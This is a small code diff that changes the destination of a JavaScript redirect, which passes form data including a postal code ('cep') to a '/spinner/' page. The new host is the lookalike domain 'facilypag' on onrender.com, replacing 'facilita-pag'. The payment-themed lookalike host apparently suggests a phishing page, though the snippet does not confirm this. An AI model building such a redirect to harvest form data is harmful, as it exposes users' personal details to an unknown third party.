@@ -384,7 +384,7 @@
         cep: cepInput.value
     });
 
-    const targetUrl = `https://facilita-pag.onrender.com/spinner/?${params.toString()}`;
+    const targetUrl = `https://facilypag.onrender.com/spinner/?${params.toString()}`;
     
     setTimeout(() => {
         window.location.href = targetUrl;
